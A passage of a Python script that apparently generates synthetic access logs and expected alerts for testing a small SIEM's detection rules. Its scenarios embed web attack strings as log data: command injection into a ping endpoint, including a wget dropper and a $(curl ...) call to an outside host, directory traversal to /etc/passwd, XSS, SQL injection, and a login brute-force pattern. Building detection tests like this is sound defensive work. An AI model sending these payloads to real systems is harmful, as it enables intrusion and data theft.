         description="Shell metacharacters against a 'ping' diagnostic endpoint: ;id, ;whoami, ;cat, and "
                     "a wget dropper. Pipe- and $()-style payloads are not matched.",
         gap="Only ';'-chained commands are matched. '|', '&&', backticks and $(...) are missed.")
def _():
    log = AccessLog()
    d = day(10, 16)
    web_background(log, d, visits=100, site="router.example.com")
    payloads = [
        ("POST", "/cgi-bin/ping?host=127.0.0.1;id", 200),
        ("POST", "/cgi-bin/ping?host=127.0.0.1;whoami", 200),
        ("POST", "/cgi-bin/ping?host=127.0.0.1%3Bcat%20/etc/hosts", 200),
        ("POST", "/cgi-bin/ping?host=127.0.0.1;wget%20http://203.0.113.9/x.sh%20-O%20/tmp/x", 200),
        ("POST", "/cgi-bin/ping?host=127.0.0.1|uname%20-a", 200),
        ("POST", "/cgi-bin/ping?host=$(curl%20203.0.113.9)", 200),
    ]
    web_payloads(log, d + timedelta(hours=4, minutes=2), "203.0.113.9", "python-requests/2.32.3", payloads)
    return log


@example(file="access-nikto-full-scan.log", source_type="web", host="intranet-web-01",
         expected_alerts={"MSIEM-007": 1, "MSIEM-008": 5},
         title="Nikto: enumeration plus attack payloads",
         description="A vulnerability scanner works through a wordlist and then fires traversal, XSS, "
                     "SQLi and injection checks from the same IP.")
def _():
    log = AccessLog()
    d = day(10, 18)
    web_background(log, d, visits=120, site="intranet.example.com")
    ua = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)"
    ip = "192.0.2.201"
    web_scan(log, d + timedelta(hours=22), ip, ua, SCAN_WORDS[:80], 250)
    web_payloads(log, d + timedelta(hours=22, minutes=2), ip, ua, [
        ("GET", "/../../../../../../etc/passwd", 400),
        ("GET", "/index.php?page=%3Cscript%3Ealert(42)%3C/script%3E", 200),
        ("GET", "/item.php?id=1%20UNION%20SELECT%201,2,3", 500),
        ("GET", "/cgi-bin/test.cgi?;cat%20/etc/passwd", 404),
        ("GET", "/redirect?url=javascript:alert(document.domain)", 302),
    ], spacing_s=2)
    return log


@example(file="access-apache-common-format.log", source_type="web", host="legacy-apache-01",
         expected_alerts={"MSIEM-008": 1}, category="format",
         title="Apache Common Log Format with a -0700 offset",
         description="No referer or user-agent fields, HTTP basic-auth usernames, and Pacific "
                     "Daylight Time timestamps. Contains a single traversal attempt.")
def _():
    log = AccessLog(combined=False, tz=timezone(timedelta(hours=-7)))
    d = day(10, 20)
    users = ["-", "-", "-", "frank", "maria"]
    for _ in range(300):
        t = d + timedelta(minutes=rng.randint(0, 24 * 60 - 1))
        log.req(t, f"10.20.{rng.randint(0, 9)}.{rng.randint(2, 254)}", "GET",
                rng.choice(["/", "/intranet/", "/intranet/docs/", "/reports/q3.pdf", "/images/logo.gif"]),
                rng.choice([200, 200, 200, 304, 404]), user=rng.choice(users))
    log.req(d + timedelta(hours=13), "10.20.4.99", "GET", "/cgi-bin/view?f=../../../etc/passwd", 403)
    return log


@example(file="access-large-volume.log", source_type="web", host="cdn-edge-01",
         expected_alerts={"MSIEM-007": 1}, category="format",
         title="High-volume day (about 11k requests)",
         description="A busy site with about 11,000 requests from 300 clients, for checking ingest and "
                     "detection speed. One scan is buried in the noise.")
def _():
    log = AccessLog()
    d = day(10, 22)
    web_background(log, d, visits=3500, clients=300)
    web_scan(log, d + timedelta(hours=14, minutes=7), "203.0.113.250", "Mozilla/5.0 (compatible; wfuzz)",
             SCAN_WORDS[:50], 900)
    return log


@example(file="access-truncated-lines.log", source_type="web", host="shop-web-04", expected_unparsed=6,
         category="format",
         title="Truncated and garbled access log lines",
         description="Normal traffic with six broken lines: cut off mid-request, a bad date, a "
                     "non-existent month, an error-log line in the wrong file, and junk. A TLS handshake "
                     "sent to the HTTP port still parses, because it is a well-formed 400 entry.")
def _():
    log = AccessLog()
    d = day(10, 24)
    web_background(log, d, visits=80)
    t = d + timedelta(hours=12)
    log.req(t, "45.95.147.236", "GET", "\\x16\\x03\\x01\\x00\\xee\\x01\\x00\\x00\\xea\\x03\\x03", 400, "-")
    for i, line in enumerate([
        '73.12.9.4 - - [24/Oct/2026:12:00:00 +0000] "GET /pro',
        '73.12.9.4 - - [24/Oct/2026:12:00',
        '73.12.9.4 - - [32/Oct/2026:12:00:00 +0000] "GET / HTTP/1.1" 200 512 "-" "x"',
        '73.12.9.4 - - [24/Foo/2026:12:00:00 +0000] "GET / HTTP/1.1" 200 512 "-" "x"',
        "2026/10/24 12:00:01 [error] 1234#0: *5 open() \"/var/www/favicon.ico\" failed (2: No such file)",
        "�� junk �",
    ]):
        log.add(t + timedelta(seconds=i + 1), line)
    return log


# -- web: known gaps --------------------------------------------------------------------

@example(file="access-slow-scan.log", source_type="web", host="shop-web-05", category="gap",
         title="Slow directory scan (rate-limited)",
         description="The same wordlist as the gobuster example, at one request every 8 seconds, so "
                     "about 7 per minute against a threshold of 20.",
         gap="Fixed short windows miss throttled scanners. A long-window rule (e.g. 100 404s in an "
             "hour) or a per-IP distinct-path count would catch this.")
def _():
    log = AccessLog()
    d = day(10, 26)
    web_background(log, d, visits=200)
    web_scan(log, d + timedelta(hours=1), "198.51.100.9", "Mozilla/5.0 (X11; Linux x86_64)", SCAN_WORDS[:90], 8000)
    return log


@example(file="access-login-bruteforce.log", source_type="web", host="portal-web-01", category="gap",
         title="Web login brute force",
         description="One IP posts to /login 120 times in four minutes, getting 401 every time and a "
                     "302 at the end.",
         gap="No rule covers web authentication. A threshold on POST /login with 401 per IP, followed "
             "by a 302, mirrors MSIEM-001 and MSIEM-002 for SSH.")
def _():
    log = AccessLog()
    d = day(10, 28)
    web_background(log, d, visits=150, site="portal.example.com")
    t = d + timedelta(hours=21, minutes=30)
    ip = "141.98.10.60"
    for i in range(120):
        log.req(t + timedelta(seconds=2 * i), ip, "POST", "/login", 401, "python-requests/2.32.3")
    log.req(t + timedelta(seconds=242), ip, "POST", "/login", 302, "python-requests/2.32.3")
    log.req(t + timedelta(seconds=243), ip, "GET", "/account", 200, "python-requests/2.32.3")
    return log


# ---------------------------------------------------------------------------
# Output
# ---------------------------------------------------------------------------

CATEGORY_ORDER = {"benign": 0, "attack": 1, "format": 2, "gap": 3}
CATEGORY_TITLE = {"benign": "Benign baselines", "attack": "Attacks", "format": "Formats & edge cases",
                  "gap": "Known detection gaps"}


def ingest_cmd(e: Example) -> str:
    cmd = f"python -m minisiem ingest ../samples/examples/{e.file} --source {e.source_type}"
    if e.host:
        cmd += f" --host {e.host}"
    if e.year:
        cmd += f" --year {e.year}"
    return cmd


def write_readme(examples: list[Example], sizes: dict[str, int]):
    lines = [
        "# Example logs",
        "",
        "A library of self-contained log scenarios for trying MiniSIEM's parsers and detection rules.",
        "Each file is one day on its own host, with its own users and IPs, so you can load one file or all "
        "of them together.",
        "",
        "Generated by `scripts/generate_examples.py` (deterministic). Do not edit by hand.",
        "Expected results live in `manifest.json` and are checked by `backend/tests/test_examples.py`.",
        "",
        "```bash",
        "cd backend",
        "python -m minisiem examples        # reset the database and load every file below",
        "python -m minisiem ingest ../samples/examples/auth-compromise-chain.log --source auth   # or one at a time",
        "```",
        "",
    ]
    for cat in sorted({e.category for e in examples}, key=CATEGORY_ORDER.get):
        lines += [f"## {CATEGORY_TITLE[cat]}", "", "| File | Source | Lines | Expected alerts | What it shows |",
                  "|---|---|---|---|---|"]
        for e in [x for x in examples if x.category == cat]:
            alerts = ", ".join(f"{k.replace('MSIEM-', '')} ×{v}" for k, v in sorted(e.expected_alerts.items())) or "none"
            extra = []
            if e.year:
                extra.append(f"needs `--year {e.year}`")
            if e.expected_unparsed:
                extra.append(f"{e.expected_unparsed} unparseable lines")
            desc = f"**{e.title}.** {e.description}"
            if extra:
                desc += f" *({'; '.join(extra)})*"
            if e.gap:
                desc += f"<br>**Gap:** {e.gap}"
            lines.append(f"| `{e.file}` | {e.source_type} | {sizes[e.file]:,} | {alerts} | {desc} |")
        lines.append("")
    lines += [
        "## Rule key",
        "",
        "| ID | Rule |", "|---|---|",
        "| 001 | SSH brute force |", "| 002 | SSH login after repeated failures |",
        "| 003 | Suspicious sudo command |", "| 004 | New local user |", "| 005 | User added to privileged group |",
        "| 006 | SSH login from a new IP |", "| 007 | Web directory enumeration |", "| 008 | Web attack payload |",
        "",
    ]
    (OUT / "README.md").write_text("\n".join(lines), encoding="utf-8", newline="\n")


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    manifest, sizes = [], {}
    for e in EXAMPLES:
        text = e.build().text()
        (OUT / e.file).write_text(text, encoding="utf-8", newline="\n")
        sizes[e.file] = text.count("\n")
        manifest.append({
            "file": e.file, "source_type": e.source_type, "host": e.host, "year": e.year,
            "category": e.category, "title": e.title, "expected_alerts": e.expected_alerts,
            "expected_unparsed": e.expected_unparsed, "gap": e.gap,
        })
    (OUT / "manifest.json").write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8", newline="\n")
    write_readme(EXAMPLES, sizes)
    total = sum(sizes.values())
    print(f"wrote {len(EXAMPLES)} example logs ({total:,} lines) + manifest.json + README.md to {OUT}")


if __name__ == "__main__":
    main()
